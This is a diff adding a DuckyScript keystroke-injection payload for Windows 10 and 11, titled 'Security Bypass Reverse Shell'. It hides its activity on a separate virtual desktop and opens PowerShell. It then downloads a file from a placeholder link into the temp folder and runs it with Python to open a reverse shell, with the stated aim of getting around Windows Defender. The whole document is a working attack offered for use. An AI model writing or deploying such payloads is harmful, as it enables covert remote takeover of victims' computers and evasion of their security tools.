@@ -1,0 +1,47 @@
+REM     Title: Security Bypass Reverse Shell
+REM     Author: arielle-the-first
+REM     Target: Windows 10, 11
+REM     Description: Starts a reverse shell through a python script to mitidage windows defender
+
+REM Hide The Powershell Window Within A Seperate Desktop Enviorment
+DELAY 1000
+GUI TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 250
+LEFT
+DELAY 250
+ENTER
+DELAY 250
+
+REM Open Powershell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+REM Download The File:
+STRING $url = "<LINK GOES HERE>"
+ENTER
+STRING $output = "$env:TEMP\shell-reversed.dll"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile $output
+ENTER
+DELAY 750
+
+REM Make The Connection
+STRING python $output
+ENTER
+
+REM Return to the Origional Desktop Enviorment
+GUI TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
